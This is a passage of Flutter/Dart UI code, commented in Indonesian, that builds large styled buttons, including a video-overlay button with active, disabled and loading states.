          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: border, width: 1.5),
          boxShadow: [BoxShadow(
              color: Colors.black.withOpacity(0.04),
              blurRadius: 8, offset: const Offset(0, 2))],
        ),
        child: loading
            ? Center(child: SizedBox(width: 24, height: 24,
                child: CircularProgressIndicator(strokeWidth: 2, color: accentCol)))
            : Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(icon, size: 28, color: fg),
                const SizedBox(height: 8),
                Text(label, textAlign: TextAlign.center,
                    style: TextStyle(color: fg, fontWeight: FontWeight.bold,
                        fontSize: 12, fontFamily: 'monospace')),
              ]),
      ),
    );
  }

  // ── Tombol Video Overlay (oranye/merah dengan gaya khas) ─────────────
  Widget _bigBtnVideo({
    required String label,
    required IconData icon,
    required bool active,
    required Color activeColor,
    required Color idleColor,
    required VoidCallback? onTap,
    bool loading = false,
  }) {
    final disabled = onTap == null && !loading;
    final bg     = disabled
        ? Colors.grey.shade100
        : active
            ? activeColor
            : Colors.white;
    final fg     = disabled
        ? Colors.black26
        : active
            ? Colors.white
            : idleColor;
    final border = disabled
        ? Colors.black12
        : active
            ? activeColor
            : idleColor.withOpacity(0.5);

    return GestureDetector(
      onTap: loading ? null : onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 20),
        decoration: BoxDecoration(
          color: bg,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: border, width: 1.5),
          boxShadow: [
            BoxShadow(
              color: (active ? activeColor : Colors.black).withOpacity(0.08),
              blurRadius: 8,
              offset: const Offset(0, 2),
            ),
          ],
        ),
        child: loading
            ? Center(
                child: SizedBox(
                  width: 24, height: 24,
                  child: CircularProgressIndicator(
                    strokeWidth: 2, color: idleColor),
                ))
            : Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(icon, size: 30, color: fg),
                  const SizedBox(height: 8),
                  Text(label,
                      textAlign: TextAlign.center,
                      style: TextStyle(
                          color: fg,
                          fontWeight: FontWeight.bold,
                          fontSize: 12,
                          fontFamily: 'monospace')),
                ],
              ),
      ),
    );
  }
}
